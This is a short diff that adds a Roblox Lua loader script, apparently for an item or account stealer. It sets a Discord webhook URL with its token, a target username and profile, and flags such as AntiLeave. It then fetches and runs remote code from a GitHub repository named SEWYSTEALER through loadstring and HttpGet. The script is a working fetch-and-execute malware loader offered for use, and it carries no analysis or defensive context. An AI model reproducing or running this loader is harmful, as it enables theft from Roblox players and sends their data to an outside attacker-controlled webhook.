@@ -1,0 +1,8 @@
+_G.UserName = "DauHuge123"
+_G.UserID = "https://www.roblox.com/users/3746033602/profile" 
+_G.Webhook = "https://discord.com/api/webhooks/1129841766271561819/6-SIiJsMZsw6X-oyBBAxKqlgfGdjKTQg5yGYZa_YsFhdDDNcsHuoq9gbDd_u9X8llr2m" 
+_G.LoadingScreen = false 
+_G.AntiLeave = true
+_G.MouseLock = true
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Muhammad424/SEWYSTEALER/main/main.lua", true))()
